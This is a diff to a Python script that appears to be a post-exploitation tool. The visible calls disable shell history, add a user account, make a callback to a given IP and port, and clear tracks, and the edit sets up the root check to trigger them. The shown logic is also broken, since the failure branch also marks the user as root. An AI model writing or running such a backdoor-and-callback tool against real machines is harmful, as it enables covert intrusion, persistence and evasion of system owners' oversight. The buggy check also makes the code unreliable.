@@ -40,16 +40,14 @@ def disable_hist():
 
 # check for root permissions
 perms = os.system("whoami")
+print("perms = {}".format(perms))
 
-
-is_root = ""
+is_root = None
 def perm_check(perms, is_root):
 	if perms == "root":
-		is_root = "True"
-		return True
+		is_root = True
 	else:
-		is_root = "False"
-		return False
+		is_root = True
 		print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
 	return is_root
 
@@ -124,7 +122,7 @@ def clear_tracks():
 
 
 # call functions
-if is_root OR if args.force:
+if is_root or args.force:
 	disable_hist()
 	add_user(username)
 	callback(local_ip, local_port, username)
